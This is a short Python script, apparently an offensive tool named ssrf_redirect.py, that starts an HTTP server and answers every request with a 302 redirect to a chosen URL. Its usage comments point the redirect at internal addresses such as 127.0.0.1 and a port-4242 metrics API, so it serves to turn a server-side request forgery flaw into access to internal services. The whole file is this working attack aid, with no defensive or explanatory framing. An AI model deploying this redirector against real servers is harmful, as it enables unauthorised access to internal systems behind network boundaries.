#!/usr/bin/env python3

#python3 ./ssrf_redirect.py 8000 http://127.0.0.1/
#python3 ssrf_redirect.py 80 'http://127.0.0.1:4242/api/suggest?type=metrics'

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
